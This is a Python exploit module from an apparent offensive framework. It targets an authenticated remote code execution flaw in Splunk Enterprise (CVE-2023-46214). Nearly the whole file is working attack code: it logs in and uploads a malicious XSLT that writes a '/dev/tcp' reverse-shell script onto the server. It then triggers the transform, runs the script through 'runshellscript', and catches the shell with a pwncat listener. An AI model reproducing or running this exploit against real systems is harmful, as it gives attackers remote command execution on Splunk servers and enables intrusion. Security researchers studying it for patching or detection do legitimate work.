from core.modular import Module
from modules.io import *

import requests
import json
import socket
import threading
import pwncat.manager


class Exploit(Module):
    """
    This Exploit module targets a Remote Code Execution vulnerability in Splunk Enterprise.
    Vulnerable versions include 9.0.x before 9.0.7 and 9.1.x before 9.1.2. The exploit uses
    improperly sanitized XSLT data to execute a reverse shell on the target machine.
    Once executed, it opens a reverse shell connection to the attacker's machine, allowing
    for remote command execution on the Splunk instance.
    """

    def __init__(self):
        """
        Initialize an Exploit object for the Splunk CVE-2023-46214 RCE PoC.
        """
        super().__init__()
        self.name = "CVE-2023-46214"
        self.description = (
            "(Authenticated) RCE in Splunk (9.0.x < 9.0.7, 9.1.x < 9.1.2)"
        )
        self.author = "Chocapikk"
        self.creation_date = "20-11-2023"
        self.session = None

    def execute(self):
        """
        Orchestrates the exploitation process including gathering input, authenticating,
        uploading the malicious file, triggering the exploit, and handling the reverse shell.
        """
        self.url = input_data(self.name, "Enter Splunk instance URL")
        self.username = input_data(self.name, "Enter Splunk username")
        self.password = input_data(self.name, "Enter Splunk password")
        self.ip = input_data(self.name, "Enter Reverse Shell IP")
        self.port = input_data(self.name, "Enter Reverse Shell Port")
        self.session = requests.Session()

        connection_event = threading.Event()
        listener_thread = threading.Thread(
            target=self.start_listener, args=(self.ip, int(self.port), connection_event)
        )
        listener_thread.start()

        print_info("Original PoC by: https://github.com/nathan31337/Splunk-RCE-poc")

        if not self.authenticate():
            return print_error("Authentication failed")
        print_info("Successfully authenticated on the Splunk instance.")

        if not self.fetch_csrf_token():
            return print_error("Failed to obtain CSRF token")
        print_info("CSRF token successfully obtained.")

        malicious_xsl = self.generate_malicious_xsl()
        uploaded, text_value = self.upload_malicious_file(malicious_xsl)
        if not uploaded:
            return print_error("File upload failed")
        print_info(
            f"Malicious XSL file uploaded successfully. Text value: {text_value}"
        )

        jsid_created, jsid = self.get_job_search_id()
        if not jsid_created:
            return print_error("Creating job failed")
        print_info(f"Job search ID obtained successfully. JSID: {jsid}")

        if not self.trigger_xslt_transform(jsid, text_value):
            return print_error("XSLT Transform failed")
        print_info("XSLT transform triggered successfully.")

        if not self.trigger_reverse_shell(jsid):
            return print_error("Failed to execute reverse shell")
        print_info("Reverse shell command executed. Awaiting connection...")

        connection_event.wait(timeout=5)
        if not connection_event.is_set():
            print_error("Failed to establish a reverse shell connection.")
            listener_thread.join()
            return

        print_info("Reverse shell established. Interacting with the target...")
        listener_thread.join()

    def authenticate(self):
        """
        Authenticates against the target Splunk instance using provided credentials.

        :return: True if authentication is successful, False otherwise.
        """

        login_url = f"{self.url}/en-US/account/login?return_to=%2Fen-US%2Faccount%2F"
        response = self.session.get(login_url)
        cval_value = self.session.cookies.get("cval", None)

        if not cval_value:
            return False

        auth_payload = {
            "cval": cval_value,
            "username": self.username,
            "password": self.password,
            "set_has_logged_in": "false",
        }

        auth_url = f"{self.url}/en-US/account/login"
        response = self.session.post(auth_url, data=auth_payload)
        return response.status_code == 200

    def fetch_csrf_token(self):
        """
        Fetches a CSRF token from the target Splunk instance for post-authentication requests.

        :return: True if the CSRF token is successfully retrieved, False otherwise.
        """

        response = self.session.get(f"{self.url}/en-US")
        return response.status_code == 200

    def generate_malicious_xsl(self):
        """
        Generates a malicious XSLT file for triggering the RCE.

        :return: A string containing the contents of the malicious XSLT file.
        """

        return f"""<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
            <xsl:template match="/">
                <exsl:document href="/opt/splunk/bin/scripts/shell.sh" method="text">
                    <xsl:text>sh -i &gt;&amp; /dev/tcp/{self.ip}/{self.port} 0&gt;&amp;1</xsl:text>
                </exsl:document>
            </xsl:template>
        </xsl:stylesheet>
        """

    def upload_malicious_file(self, file_content):
        """
        Uploads the malicious XSLT file to the target Splunk instance.

        :param file_content: The content of the file to be uploaded.
        :return: Tuple (bool, str) indicating success status and a message or identifier related to the uploaded file.
        """

        csrf_token = self.session.cookies.get("splunkweb_csrf_token_8000", None)
        files = {"spl-file": ("shell.xsl", file_content, "application/xslt+xml")}
        upload_headers = {
            "User-Agent": "Axer Framework",
            "Accept": "text/javascript, text/html, application/xml, text/xml, */*",
            "X-Requested-With": "XMLHttpRequest",
            "X-Splunk-Form-Key": csrf_token,
        }

        upload_url = f"{self.url}/en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=shell.xsl"
        response = self.session.post(
            upload_url, files=files, headers=upload_headers, verify=False
        )

        try:
            text_value = json.loads(response.text)["messages"][0]["text"]
            if "concatenate" in text_value:
                return False, None
            return True, text_value
        except (json.JSONDecodeError, KeyError, IndexError):
            return False, None

    def get_job_search_id(self):
        """
        Initiates a job search on the Splunk instance, required for triggering the XSLT transform.

        :return: Tuple (bool, str) where the first element indicates success, and the second is the job search ID if successful.
        """

        csrf_token = self.session.cookies.get("splunkweb_csrf_token_8000", None)
        jsid_data = {"search": "|search test|head 1"}
        jsid_url = f"{self.url}/en-US/splunkd/__raw/servicesNS/{self.username}/search/search/jobs?output_mode=json"
        upload_headers = {
            "User-Agent": "Axer Framework",
            "X-Requested-With": "XMLHttpRequest",
            "X-Splunk-Form-Key": csrf_token,
        }
        response = self.session.post(
            jsid_url, data=jsid_data, headers=upload_headers, verify=False
        )
        try:
            jsid = json.loads(response.text)["sid"]
            return True, jsid
        except (json.JSONDecodeError, KeyError, IndexError):
            return False, None

    def trigger_xslt_transform(self, jsid, text_value):
        """
        Triggers the XSLT transformation using the uploaded malicious file.

        :param jsid: Job search ID obtained from the Splunk instance.
        :param text_value: The text value or identifier of the uploaded XSLT file.
        :return: True if the transformation is successfully triggered, False otherwise.
        """

        xslt_headers = {
            "User-Agent": "Axer Framework",
            "X-Splunk-Module": "Splunk.Module.DispatchingModule",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "X-Requested-With": "XMLHttpRequest",
        }
        exploit_endpoint = f"{self.url}/en-US/api/search/jobs/{jsid}/results?xsl=/opt/splunk/var/run/splunk/dispatch/{text_value}/shell.xsl"
        response = self.session.get(
            exploit_endpoint, verify=False, headers=xslt_headers
        )
        return response.status_code == 200

    def trigger_reverse_shell(self, jsid):
        """
        Executes the reverse shell script on the Splunk instance.

        :param jsid: Job search ID obtained from the Splunk instance.
        :return: True if the reverse shell is successfully executed, False otherwise.
        """

        csrf_token = self.session.cookies.get("splunkweb_csrf_token_8000", None)
        runshellscript_data = {
            "search": f'|runshellscript "shell.sh" "" "" "" "" "" "" "" "{jsid}"'
        }
        runshellscript_url = f"{self.url}/en-US/splunkd/__raw/servicesNS/{self.username}/search/search/jobs"
        upload_headers = {
            "User-Agent": "Axer Framework",
            "X-Requested-With": "XMLHttpRequest",
            "X-Splunk-Form-Key": csrf_token,
        }
        response = self.session.post(
            runshellscript_url,
            data=runshellscript_data,
            headers=upload_headers,
            verify=False,
        )
        return response.status_code == 201

    def start_listener(self, listener_ip, listener_port, connection_event):
        """
        Starts a listener on the specified IP and port to catch the reverse shell connection from the target.
        Once a connection is established, it initiates a session with pwncat manager for further interaction.

        :param listener_ip: IP address on which to start the listener.
        :param listener_port: Port on which to start the listener.
        :param connection_event: Threading event to signal when a connection is received.
        """
        try:
            print_status(f"Starting listener on {listener_ip}:{listener_port}")
            with socket.create_server((listener_ip, listener_port)) as listener:
                listener.settimeout(5)
                print_status("Waiting for incoming connection...")
                victim, victim_addr = listener.accept()
                print_success(
                    f"Received connection from {victim_addr[0]}:{victim_addr[1]}"
                )
                connection_event.set()

                with pwncat.manager.Manager() as manager:
                    manager.create_session(
                        platform="linux", protocol="socket", client=victim
                    )
                    print_status(
                        f"Dropping to pwncat prompt on {listener_ip}:{listener_port}..."
                    )
                    manager.interactive()

        except socket.timeout:
            print_error("No reverse shell received within 5 seconds.")
        except Exception as e:
            print_error(f"An error occurred: {e}")
